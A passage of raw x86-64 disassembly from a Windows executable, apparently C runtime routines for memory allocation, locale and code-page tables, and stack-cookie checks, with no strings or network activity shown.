   140006abb:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140006ac0:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140006ac5:	48 83 c4 30          	add    $0x30,%rsp
   140006ac9:	41 5f                	pop    %r15
   140006acb:	41 5e                	pop    %r14
   140006acd:	41 5d                	pop    %r13
   140006acf:	41 5c                	pop    %r12
   140006ad1:	5f                   	pop    %rdi
   140006ad2:	c3                   	ret
   140006ad3:	4d 8d 78 01          	lea    0x1(%r8),%r15
   140006ad7:	ba 02 00 00 00       	mov    $0x2,%edx
   140006adc:	4c 03 fd             	add    %rbp,%r15
   140006adf:	49 8b cf             	mov    %r15,%rcx
   140006ae2:	e8 cd fa ff ff       	call   0x1400065b4
   140006ae7:	48 8b d8             	mov    %rax,%rbx
   140006aea:	4d 85 f6             	test   %r14,%r14
   140006aed:	74 19                	je     0x140006b08
   140006aef:	4d 8b ce             	mov    %r14,%r9
   140006af2:	4d 8b c5             	mov    %r13,%r8
   140006af5:	49 8b d7             	mov    %r15,%rdx
   140006af8:	48 8b c8             	mov    %rax,%rcx
   140006afb:	e8 0c f9 ff ff       	call   0x14000640c
   140006b00:	85 c0                	test   %eax,%eax
   140006b02:	0f 85 d8 00 00 00    	jne    0x140006be0
   140006b08:	4d 2b fe             	sub    %r14,%r15
   140006b0b:	4a 8d 0c 73          	lea    (%rbx,%r14,2),%rcx
   140006b0f:	49 8b d7             	mov    %r15,%rdx
   140006b12:	4c 8b cd             	mov    %rbp,%r9
   140006b15:	4d 8b c4             	mov    %r12,%r8
   140006b18:	e8 ef f8 ff ff       	call   0x14000640c
   140006b1d:	85 c0                	test   %eax,%eax
   140006b1f:	0f 85 bb 00 00 00    	jne    0x140006be0
   140006b25:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140006b29:	44 8d 78 08          	lea    0x8(%rax),%r15d
   140006b2d:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   140006b31:	49 3b ce             	cmp    %r14,%rcx
   140006b34:	0f 85 9d 00 00 00    	jne    0x140006bd7
   140006b3a:	48 39 37             	cmp    %rsi,(%rdi)
   140006b3d:	75 2b                	jne    0x140006b6a
   140006b3f:	41 8b d7             	mov    %r15d,%edx
   140006b42:	8d 48 04             	lea    0x4(%rax),%ecx
   140006b45:	e8 6a fa ff ff       	call   0x1400065b4
   140006b4a:	33 c9                	xor    %ecx,%ecx
   140006b4c:	48 89 07             	mov    %rax,(%rdi)
   140006b4f:	e8 d8 fa ff ff       	call   0x14000662c
   140006b54:	48 8b 0f             	mov    (%rdi),%rcx
   140006b57:	48 85 c9             	test   %rcx,%rcx
   140006b5a:	74 42                	je     0x140006b9e
   140006b5c:	48 8d 41 20          	lea    0x20(%rcx),%rax
   140006b60:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140006b64:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140006b68:	eb 6d                	jmp    0x140006bd7
   140006b6a:	4c 2b 37             	sub    (%rdi),%r14
   140006b6d:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140006b74:	ff ff 7f 
   140006b77:	49 c1 fe 03          	sar    $0x3,%r14
   140006b7b:	4c 3b f0             	cmp    %rax,%r14
   140006b7e:	77 1e                	ja     0x140006b9e
   140006b80:	48 8b 0f             	mov    (%rdi),%rcx
   140006b83:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   140006b87:	48 8b d5             	mov    %rbp,%rdx
   140006b8a:	4d 8b c7             	mov    %r15,%r8
   140006b8d:	e8 12 22 00 00       	call   0x140008da4
   140006b92:	48 85 c0             	test   %rax,%rax
   140006b95:	75 22                	jne    0x140006bb9
   140006b97:	33 c9                	xor    %ecx,%ecx
   140006b99:	e8 8e fa ff ff       	call   0x14000662c
   140006b9e:	48 8b cb             	mov    %rbx,%rcx
   140006ba1:	e8 86 fa ff ff       	call   0x14000662c
   140006ba6:	be 0c 00 00 00       	mov    $0xc,%esi
   140006bab:	33 c9                	xor    %ecx,%ecx
   140006bad:	e8 7a fa ff ff       	call   0x14000662c
   140006bb2:	8b c6                	mov    %esi,%eax
   140006bb4:	e9 fd fe ff ff       	jmp    0x140006ab6
   140006bb9:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140006bbd:	48 89 07             	mov    %rax,(%rdi)
   140006bc0:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140006bc4:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   140006bc8:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140006bcc:	33 c9                	xor    %ecx,%ecx
   140006bce:	e8 59 fa ff ff       	call   0x14000662c
   140006bd3:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140006bd7:	48 89 19             	mov    %rbx,(%rcx)
   140006bda:	4c 01 7f 08          	add    %r15,0x8(%rdi)
   140006bde:	eb cb                	jmp    0x140006bab
   140006be0:	45 33 c9             	xor    %r9d,%r9d
   140006be3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006be8:	45 33 c0             	xor    %r8d,%r8d
   140006beb:	33 d2                	xor    %edx,%edx
   140006bed:	33 c9                	xor    %ecx,%ecx
   140006bef:	e8 68 f7 ff ff       	call   0x14000635c
   140006bf4:	cc                   	int3
   140006bf5:	cc                   	int3
   140006bf6:	cc                   	int3
   140006bf7:	cc                   	int3
   140006bf8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006bfd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006c02:	57                   	push   %rdi
   140006c03:	48 83 ec 20          	sub    $0x20,%rsp
   140006c07:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140006c0b:	48 8b f9             	mov    %rcx,%rdi
   140006c0e:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   140006c12:	48 85 d2             	test   %rdx,%rdx
   140006c15:	74 05                	je     0x140006c1c
   140006c17:	0f 10 02             	movups (%rdx),%xmm0
   140006c1a:	eb 10                	jmp    0x140006c2c
   140006c1c:	83 3d f1 22 01 00 00 	cmpl   $0x0,0x122f1(%rip)        # 0x140018f14
   140006c23:	75 0d                	jne    0x140006c32
   140006c25:	0f 10 05 2c 1b 01 00 	movups 0x11b2c(%rip),%xmm0        # 0x140018758
   140006c2c:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140006c30:	eb 4e                	jmp    0x140006c80
   140006c32:	e8 1d f0 ff ff       	call   0x140005c54
   140006c37:	48 89 07             	mov    %rax,(%rdi)
   140006c3a:	48 8b d6             	mov    %rsi,%rdx
   140006c3d:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140006c44:	48 89 0e             	mov    %rcx,(%rsi)
   140006c47:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140006c4e:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140006c52:	48 8b c8             	mov    %rax,%rcx
   140006c55:	e8 4e 2b 00 00       	call   0x1400097a8
   140006c5a:	48 8b 0f             	mov    (%rdi),%rcx
   140006c5d:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140006c61:	e8 ae 2b 00 00       	call   0x140009814
   140006c66:	48 8b 0f             	mov    (%rdi),%rcx
   140006c69:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140006c6f:	a8 02                	test   $0x2,%al
   140006c71:	75 0d                	jne    0x140006c80
   140006c73:	83 c8 02             	or     $0x2,%eax
   140006c76:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140006c7c:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140006c80:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006c85:	48 8b c7             	mov    %rdi,%rax
   140006c88:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006c8d:	48 83 c4 20          	add    $0x20,%rsp
   140006c91:	5f                   	pop    %rdi
   140006c92:	c3                   	ret
   140006c93:	cc                   	int3
   140006c94:	e9 e3 f9 ff ff       	jmp    0x14000667c
   140006c99:	cc                   	int3
   140006c9a:	cc                   	int3
   140006c9b:	cc                   	int3
   140006c9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006ca1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006ca6:	57                   	push   %rdi
   140006ca7:	48 83 ec 40          	sub    $0x40,%rsp
   140006cab:	49 8b f9             	mov    %r9,%rdi
   140006cae:	49 8b d8             	mov    %r8,%rbx
   140006cb1:	8b 0a                	mov    (%rdx),%ecx
   140006cb3:	e8 30 0d 00 00       	call   0x1400079e8
   140006cb8:	90                   	nop
   140006cb9:	48 8b 03             	mov    (%rbx),%rax
   140006cbc:	48 8b 08             	mov    (%rax),%rcx
   140006cbf:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006cc6:	48 83 c0 18          	add    $0x18,%rax
   140006cca:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140006ccf:	48 8b 0d 82 22 01 00 	mov    0x12282(%rip),%rcx        # 0x140018f58
   140006cd6:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140006cdb:	48 85 c9             	test   %rcx,%rcx
   140006cde:	74 6f                	je     0x140006d4f
   140006ce0:	48 85 c0             	test   %rax,%rax
   140006ce3:	74 5d                	je     0x140006d42
   140006ce5:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006ceb:	45 8b c8             	mov    %r8d,%r9d
   140006cee:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140006cf2:	0f 10 00             	movups (%rax),%xmm0
   140006cf5:	0f 11 01             	movups %xmm0,(%rcx)
   140006cf8:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140006cfc:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140006d00:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140006d04:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140006d08:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140006d0c:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140006d10:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140006d14:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140006d18:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140006d1c:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140006d20:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140006d24:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140006d28:	48 03 ca             	add    %rdx,%rcx
   140006d2b:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140006d2f:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140006d33:	48 03 c2             	add    %rdx,%rax
   140006d36:	49 83 e9 01          	sub    $0x1,%r9
   140006d3a:	75 b6                	jne    0x140006cf2
   140006d3c:	8a 00                	mov    (%rax),%al
   140006d3e:	88 01                	mov    %al,(%rcx)
   140006d40:	eb 27                	jmp    0x140006d69
   140006d42:	33 d2                	xor    %edx,%edx
   140006d44:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140006d4a:	e8 e1 61 00 00       	call   0x14000cf30
   140006d4f:	e8 40 f8 ff ff       	call   0x140006594
   140006d54:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006d5a:	e8 dd f5 ff ff       	call   0x14000633c
   140006d5f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006d65:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140006d69:	48 8b 03             	mov    (%rbx),%rax
   140006d6c:	48 8b 08             	mov    (%rax),%rcx
   140006d6f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006d76:	48 05 19 01 00 00    	add    $0x119,%rax
   140006d7c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006d81:	48 8b 0d d8 21 01 00 	mov    0x121d8(%rip),%rcx        # 0x140018f60
   140006d88:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140006d8d:	48 85 c9             	test   %rcx,%rcx
   140006d90:	74 5e                	je     0x140006df0
   140006d92:	48 85 c0             	test   %rax,%rax
   140006d95:	74 4c                	je     0x140006de3
   140006d97:	0f 10 00             	movups (%rax),%xmm0
   140006d9a:	0f 11 01             	movups %xmm0,(%rcx)
   140006d9d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140006da1:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140006da5:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140006da9:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140006dad:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140006db1:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140006db5:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140006db9:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140006dbd:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140006dc1:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140006dc5:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140006dc9:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140006dcd:	48 03 ca             	add    %rdx,%rcx
   140006dd0:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140006dd4:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140006dd8:	48 03 c2             	add    %rdx,%rax
   140006ddb:	49 83 e8 01          	sub    $0x1,%r8
   140006ddf:	75 b6                	jne    0x140006d97
   140006de1:	eb 1d                	jmp    0x140006e00
   140006de3:	33 d2                	xor    %edx,%edx
   140006de5:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140006deb:	e8 40 61 00 00       	call   0x14000cf30
   140006df0:	e8 9f f7 ff ff       	call   0x140006594
   140006df5:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006dfb:	e8 3c f5 ff ff       	call   0x14000633c
   140006e00:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006e04:	48 8b 08             	mov    (%rax),%rcx
   140006e07:	48 8b 11             	mov    (%rcx),%rdx
   140006e0a:	83 c8 ff             	or     $0xffffffff,%eax
   140006e0d:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   140006e11:	83 f8 01             	cmp    $0x1,%eax
   140006e14:	75 1b                	jne    0x140006e31
   140006e16:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006e1a:	48 8b 08             	mov    (%rax),%rcx
   140006e1d:	48 8d 05 9c 12 01 00 	lea    0x1129c(%rip),%rax        # 0x1400180c0
   140006e24:	48 39 01             	cmp    %rax,(%rcx)
   140006e27:	74 08                	je     0x140006e31
   140006e29:	48 8b 09             	mov    (%rcx),%rcx
   140006e2c:	e8 fb f7 ff ff       	call   0x14000662c
   140006e31:	48 8b 03             	mov    (%rbx),%rax
   140006e34:	48 8b 10             	mov    (%rax),%rdx
   140006e37:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006e3b:	48 8b 08             	mov    (%rax),%rcx
   140006e3e:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140006e45:	48 89 01             	mov    %rax,(%rcx)
   140006e48:	48 8b 03             	mov    (%rbx),%rax
   140006e4b:	48 8b 08             	mov    (%rax),%rcx
   140006e4e:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006e55:	f0 ff 00             	lock incl (%rax)
   140006e58:	8b 0f                	mov    (%rdi),%ecx
   140006e5a:	e8 dd 0b 00 00       	call   0x140007a3c
   140006e5f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006e64:	48 83 c4 40          	add    $0x40,%rsp
   140006e68:	5f                   	pop    %rdi
   140006e69:	c3                   	ret
   140006e6a:	cc                   	int3
   140006e6b:	cc                   	int3
   140006e6c:	40 53                	rex push %rbx
   140006e6e:	48 83 ec 40          	sub    $0x40,%rsp
   140006e72:	8b d9                	mov    %ecx,%ebx
   140006e74:	33 d2                	xor    %edx,%edx
   140006e76:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006e7b:	e8 78 fd ff ff       	call   0x140006bf8
   140006e80:	83 25 e9 20 01 00 00 	andl   $0x0,0x120e9(%rip)        # 0x140018f70
   140006e87:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140006e8a:	75 12                	jne    0x140006e9e
   140006e8c:	c7 05 da 20 01 00 01 	movl   $0x1,0x120da(%rip)        # 0x140018f70
   140006e93:	00 00 00 
   140006e96:	ff 15 dc 72 00 00    	call   *0x72dc(%rip)        # 0x14000e178
   140006e9c:	eb 15                	jmp    0x140006eb3
   140006e9e:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140006ea1:	75 14                	jne    0x140006eb7
   140006ea3:	c7 05 c3 20 01 00 01 	movl   $0x1,0x120c3(%rip)        # 0x140018f70
   140006eaa:	00 00 00 
   140006ead:	ff 15 bd 72 00 00    	call   *0x72bd(%rip)        # 0x14000e170
   140006eb3:	8b d8                	mov    %eax,%ebx
   140006eb5:	eb 17                	jmp    0x140006ece
   140006eb7:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140006eba:	75 12                	jne    0x140006ece
   140006ebc:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140006ec1:	c7 05 a5 20 01 00 01 	movl   $0x1,0x120a5(%rip)        # 0x140018f70
   140006ec8:	00 00 00 
   140006ecb:	8b 58 0c             	mov    0xc(%rax),%ebx
   140006ece:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140006ed3:	74 0c                	je     0x140006ee1
   140006ed5:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140006eda:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140006ee1:	8b c3                	mov    %ebx,%eax
   140006ee3:	48 83 c4 40          	add    $0x40,%rsp
   140006ee7:	5b                   	pop    %rbx
   140006ee8:	c3                   	ret
   140006ee9:	cc                   	int3
   140006eea:	cc                   	int3
   140006eeb:	cc                   	int3
   140006eec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006ef1:	57                   	push   %rdi
   140006ef2:	48 83 ec 20          	sub    $0x20,%rsp
   140006ef6:	48 8b d9             	mov    %rcx,%rbx
   140006ef9:	33 d2                	xor    %edx,%edx
   140006efb:	48 83 c1 18          	add    $0x18,%rcx
   140006eff:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140006f05:	e8 26 60 00 00       	call   0x14000cf30
   140006f0a:	33 d2                	xor    %edx,%edx
   140006f0c:	48 8d 7b 0c          	lea    0xc(%rbx),%rdi
   140006f10:	0f b7 c2             	movzwl %dx,%eax
   140006f13:	4c 8d 0d a6 11 01 00 	lea    0x111a6(%rip),%r9        # 0x1400180c0
   140006f1a:	48 89 53 04          	mov    %rdx,0x4(%rbx)
   140006f1e:	4c 8b c3             	mov    %rbx,%r8
   140006f21:	48 89 93 20 02 00 00 	mov    %rdx,0x220(%rbx)
   140006f28:	8d 4a 06             	lea    0x6(%rdx),%ecx
   140006f2b:	66 f3 ab             	rep stos %ax,(%rdi)
   140006f2e:	48 8d 05 a3 11 01 00 	lea    0x111a3(%rip),%rax        # 0x1400180d8
   140006f35:	8b fa                	mov    %edx,%edi
   140006f37:	4c 2b c0             	sub    %rax,%r8
   140006f3a:	4a 8d 0c 0f          	lea    (%rdi,%r9,1),%rcx
   140006f3e:	48 ff c7             	inc    %rdi
   140006f41:	8a 41 18             	mov    0x18(%rcx),%al
   140006f44:	41 88 44 08 30       	mov    %al,0x30(%r8,%rcx,1)
   140006f49:	48 81 ff 01 01 00 00 	cmp    $0x101,%rdi
   140006f50:	7c e8                	jl     0x140006f3a
   140006f52:	48 8d 05 80 12 01 00 	lea    0x11280(%rip),%rax        # 0x1400181d9
   140006f59:	48 2b d8             	sub    %rax,%rbx
   140006f5c:	4a 8d 0c 0a          	lea    (%rdx,%r9,1),%rcx
   140006f60:	48 ff c2             	inc    %rdx
   140006f63:	8a 81 19 01 00 00    	mov    0x119(%rcx),%al
   140006f69:	88 84 0b 32 02 00 00 	mov    %al,0x232(%rbx,%rcx,1)
   140006f70:	48 81 fa 00 01 00 00 	cmp    $0x100,%rdx
   140006f77:	7c e3                	jl     0x140006f5c
   140006f79:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006f7e:	48 83 c4 20          	add    $0x20,%rsp
   140006f82:	5f                   	pop    %rdi
   140006f83:	c3                   	ret
   140006f84:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006f89:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140006f8e:	55                   	push   %rbp
   140006f8f:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   140006f96:	ff 
   140006f97:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   140006f9e:	48 8b 05 9b 10 01 00 	mov    0x1109b(%rip),%rax        # 0x140018040
   140006fa5:	48 33 c4             	xor    %rsp,%rax
   140006fa8:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   140006faf:	48 8b f9             	mov    %rcx,%rdi
   140006fb2:	8b 49 04             	mov    0x4(%rcx),%ecx
   140006fb5:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140006fbb:	0f 84 47 01 00 00    	je     0x140007108
   140006fc1:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140006fc6:	ff 15 b4 71 00 00    	call   *0x71b4(%rip)        # 0x14000e180
   140006fcc:	85 c0                	test   %eax,%eax
   140006fce:	0f 84 34 01 00 00    	je     0x140007108
   140006fd4:	33 c0                	xor    %eax,%eax
   140006fd6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006fdb:	bb 00 01 00 00       	mov    $0x100,%ebx
   140006fe0:	88 01                	mov    %al,(%rcx)
   140006fe2:	ff c0                	inc    %eax
   140006fe4:	48 ff c1             	inc    %rcx
   140006fe7:	3b c3                	cmp    %ebx,%eax
   140006fe9:	72 f5                	jb     0x140006fe0
   140006feb:	8a 44 24 56          	mov    0x56(%rsp),%al
   140006fef:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   140006ff4:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   140006ff9:	eb 20                	jmp    0x14000701b
   140006ffb:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   140007000:	0f b6 c8             	movzbl %al,%ecx
   140007003:	eb 0b                	jmp    0x140007010
   140007005:	3b cb                	cmp    %ebx,%ecx
   140007007:	73 0c                	jae    0x140007015
   140007009:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   14000700e:	ff c1                	inc    %ecx
   140007010:	41 3b c8             	cmp    %r8d,%ecx
   140007013:	76 f0                	jbe    0x140007005
   140007015:	48 83 c2 02          	add    $0x2,%rdx
   140007019:	8a 02                	mov    (%rdx),%al
   14000701b:	84 c0                	test   %al,%al
   14000701d:	75 dc                	jne    0x140006ffb
   14000701f:	8b 47 04             	mov    0x4(%rdi),%eax
   140007022:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140007027:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000702c:	44 8b cb             	mov    %ebx,%r9d
   14000702f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140007033:	ba 01 00 00 00       	mov    $0x1,%edx
   140007038:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   14000703f:	33 c9                	xor    %ecx,%ecx
   140007041:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007046:	e8 45 13 00 00       	call   0x140008390
   14000704b:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007050:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007055:	8b 47 04             	mov    0x4(%rdi),%eax
   140007058:	44 8b c3             	mov    %ebx,%r8d
   14000705b:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140007062:	33 c9                	xor    %ecx,%ecx
   140007064:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140007068:	48 8d 45 70          	lea    0x70(%rbp),%rax
   14000706c:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007070:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007075:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140007079:	e8 d2 30 00 00       	call   0x14000a150
   14000707e:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007083:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007088:	8b 47 04             	mov    0x4(%rdi),%eax
   14000708b:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140007091:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140007098:	33 c9                	xor    %ecx,%ecx
   14000709a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000709e:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   1400070a5:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400070a9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400070ae:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400070b2:	e8 99 30 00 00       	call   0x14000a150
   1400070b7:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   1400070bb:	4c 2b c7             	sub    %rdi,%r8
   1400070be:	4c 8d 8d 70 01 00 00 	lea    0x170(%rbp),%r9
   1400070c5:	4c 2b cf             	sub    %rdi,%r9
   1400070c8:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   1400070cf:	48 8d 47 19          	lea    0x19(%rdi),%rax
   1400070d3:	f6 02 01             	testb  $0x1,(%rdx)
   1400070d6:	74 0a                	je     0x1400070e2
   1400070d8:	80 08 10             	orb    $0x10,(%rax)
   1400070db:	41 8a 4c 00 e7       	mov    -0x19(%r8,%rax,1),%cl
   1400070e0:	eb 11                	jmp    0x1400070f3
   1400070e2:	f6 02 02             	testb  $0x2,(%rdx)
   1400070e5:	74 0a                	je     0x1400070f1
   1400070e7:	80 08 20             	orb    $0x20,(%rax)
   1400070ea:	41 8a 4c 01 e7       	mov    -0x19(%r9,%rax,1),%cl
   1400070ef:	eb 02                	jmp    0x1400070f3
   1400070f1:	32 c9                	xor    %cl,%cl
   1400070f3:	88 88 00 01 00 00    	mov    %cl,0x100(%rax)
   1400070f9:	48 83 c2 02          	add    $0x2,%rdx
   1400070fd:	48 ff c0             	inc    %rax
   140007100:	48 83 eb 01          	sub    $0x1,%rbx
   140007104:	75 cd                	jne    0x1400070d3
   140007106:	eb 3f                	jmp    0x140007147
   140007108:	33 d2                	xor    %edx,%edx
   14000710a:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   14000710e:	bb 00 01 00 00       	mov    $0x100,%ebx
   140007113:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   140007117:	41 8d 40 20          	lea    0x20(%r8),%eax
   14000711b:	83 f8 19             	cmp    $0x19,%eax
   14000711e:	77 08                	ja     0x140007128
   140007120:	80 09 10             	orb    $0x10,(%rcx)
   140007123:	8d 42 20             	lea    0x20(%rdx),%eax
   140007126:	eb 10                	jmp    0x140007138
   140007128:	41 83 f8 19          	cmp    $0x19,%r8d
   14000712c:	77 08                	ja     0x140007136
   14000712e:	80 09 20             	orb    $0x20,(%rcx)
   140007131:	8d 42 e0             	lea    -0x20(%rdx),%eax
   140007134:	eb 02                	jmp    0x140007138
   140007136:	32 c0                	xor    %al,%al
   140007138:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   14000713e:	ff c2                	inc    %edx
   140007140:	48 ff c1             	inc    %rcx
   140007143:	3b d3                	cmp    %ebx,%edx
   140007145:	72 cc                	jb     0x140007113
   140007147:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   14000714e:	48 33 cc             	xor    %rsp,%rcx
   140007151:	e8 7a 5a 00 00       	call   0x14000cbd0
   140007156:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   14000715d:	00 
   14000715e:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140007162:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140007166:	49 8b e3             	mov    %r11,%rsp
   140007169:	5d                   	pop    %rbp
   14000716a:	c3                   	ret
   14000716b:	cc                   	int3
   14000716c:	48 8b c4             	mov    %rsp,%rax
   14000716f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007173:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140007177:	4c 89 48 20          	mov    %r9,0x20(%rax)
   14000717b:	4c 89 40 18          	mov    %r8,0x18(%rax)
   14000717f:	55                   	push   %rbp
   140007180:	57                   	push   %rdi
   140007181:	41 56                	push   %r14
   140007183:	48 8d a8 78 fe ff ff 	lea    -0x188(%rax),%rbp
   14000718a:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   140007191:	44 8a f2             	mov    %dl,%r14b
   140007194:	8b d9                	mov    %ecx,%ebx
   140007196:	49 8b d1             	mov    %r9,%rdx
   140007199:	49 8b c8             	mov    %r8,%rcx
   14000719c:	e8 3b 02 00 00       	call   0x1400073dc
   1400071a1:	8b cb                	mov    %ebx,%ecx
   1400071a3:	e8 c4 fc ff ff       	call   0x140006e6c
   1400071a8:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   1400071af:	8b f8                	mov    %eax,%edi
   1400071b1:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   1400071b8:	41 3b 40 04          	cmp    0x4(%r8),%eax
   1400071bc:	75 07                	jne    0x1400071c5
   1400071be:	33 c0                	xor    %eax,%eax
   1400071c0:	e9 fe 01 00 00       	jmp    0x1400073c3
   1400071c5:	b9 28 02 00 00       	mov    $0x228,%ecx
   1400071ca:	e8 2d 11 00 00       	call   0x1400082fc
